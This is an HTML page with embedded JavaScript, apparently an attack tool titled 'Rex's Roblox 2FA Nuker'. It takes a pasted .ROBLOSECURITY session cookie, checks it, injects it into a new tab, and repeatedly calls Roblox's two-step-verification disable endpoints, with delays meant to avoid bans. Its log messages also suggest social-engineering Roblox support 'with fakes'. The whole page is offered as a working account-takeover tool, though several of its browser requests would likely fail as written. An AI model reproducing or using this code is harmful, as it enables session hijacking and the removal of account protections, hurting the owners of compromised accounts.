<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rex's Roblox 2FA Nuker</title>
    <style>
        body { font-family: Arial, sans-serif; background: #111; color: #0f0; padding: 20px; }
        h1 { color: #f44; }
        textarea, input { background: #222; color: #0f0; border: 1px solid #0f0; padding: 10px; width: 100%; max-width: 600px; }
        button { background: #f44; color: #000; border: none; padding: 15px 30px; font-size: 18px; cursor: pointer; margin: 10px 0; }
        button:hover { background: #f00; }
        #log { background: #000; border: 1px solid #333; padding: 15px; height: 300px; overflow-y: auto; white-space: pre-wrap; font-family: monospace; }
    </style>
</head>
<body>
    <h1>Rex's Roblox Cookie 2FA Killer (2026 Edition)</h1>
    <p>Paste your .ROBLOSECURITY cookie below. We'll set it, open Roblox logged in, and try slamming the disable APIs.</p>
    
    <label for="cookie">.ROBLOSECURITY Cookie:</label><br>
    <input type="text" id="cookie" placeholder=".ROBLOSECURITY=your_long_ass_cookie_here" style="margin-bottom: 10px;"><br>
    
    <button onclick="launchNuke()">Launch the Nuke 🔥</button>
    
    <div id="log">Status log will appear here...</div>

    <script>
        async function launchNuke() {
            const cookieValue = document.getElementById('cookie').value.trim();
            if (!cookieValue.startsWith('.ROBLOSECURITY=')) {
                logMessage("[-] Cookie format wrong. Should start with .ROBLOSECURITY=");
                return;
            }
            const cleanCookie = cookieValue.replace('.ROBLOSECURITY=', '');

            logMessage("[*] Starting operation...");

            // Step 1: Get user ID to build endpoints
            let userId = null;
            try {
                const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
                    method: 'GET',
                    credentials: 'include',
                    headers: { 'Cookie': `.ROBLOSECURITY=${cleanCookie}` }
                });
                if (authRes.ok) {
                    const data = await authRes.json();
                    userId = data.id;
                    logMessage(`[+] Logged in as ${data.name} (ID: ${userId})`);
                } else {
                    logMessage(`[-] Cookie invalid or dead. Status: ${authRes.status}`);
                    return;
                }
            } catch (e) {
                logMessage(`[-] Auth check failed: ${e.message}`);
                return;
            }

            // Step 2: Open Roblox in new tab with cookie (manual fallback)
            logMessage("[*] Opening Roblox settings in new tab (you'll need to confirm manually if API fails)...");
            const tab = window.open('about:blank');
            if (tab) {
                tab.document.write(`
                    <script>
                        document.cookie = ".ROBLOSECURITY=${cleanCookie}; domain=.roblox.com; path=/; secure; samesite=lax";
                        window.location = "https://www.roblox.com/my/account#!/security";
                    <\/script>
                `);
            } else {
                logMessage("[-] Popup blocked. Open https://www.roblox.com/my/account#!/security manually after setting cookie.");
            }

            // Step 3: Try API disable spam (mostly for authenticator)
            if (!userId) return;

            const endpoints = [
                `https://twostepverification.roblox.com/v1/users/${userId}/configuration/authenticator/disable`,
                `https://twostepverification.roblox.com/v1/users/${userId}/configuration/email/disable`,
                `https://twostepverification.roblox.com/v1/users/${userId}/configuration/security-key/disable`  // hardware key if any
            ];

            logMessage("[*] Hammering disable endpoints... (expect rate limits or 403s)");

            for (let i = 0; i < 5; i++) {  // 5 rounds, 3 endpoints each
                for (const ep of endpoints) {
                    try {
                        const res = await fetch(ep, {
                            method: 'POST',
                            credentials: 'include',
                            headers: {
                                'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
                                'Content-Type': 'application/json',
                                'Origin': 'https://www.roblox.com',
                                'Referer': 'https://www.roblox.com/my/account'
                            },
                            body: JSON.stringify({})  // empty payload - might need code if challenged
                        });

                        const text = await res.text();
                        logMessage(`[${ep}] Status: ${res.status} | ${text.substring(0, 150)}...`);

                        if (res.ok || res.status === 204) {
                            logMessage("[!!!] DISABLE MIGHT HAVE WORKED - CHECK SETTINGS NOW");
                            return;  // early out if success
                        }
                    } catch (e) {
                        logMessage(`[-] Fetch error on ${ep}: ${e.message}`);
                    }
                    await new Promise(r => setTimeout(r, 800));  // delay to dodge instant ban
                }
                await new Promise(r => setTimeout(r, 2000));  // round delay
            }

            logMessage("[!] Done spamming. If still prompted for code: no dice on API. Go manual in the opened tab or hit support with fakes.");
            logMessage("Pro tip: If email 2FA, control inbox → disable easy. App? Need seed/codes or SE Roblox support.");
        }

        function logMessage(msg) {
            const logDiv = document.getElementById('log');
            logDiv.innerHTML += msg + '\n';
            logDiv.scrollTop = logDiv.scrollHeight;
        }
    </script>
</body>
</html>
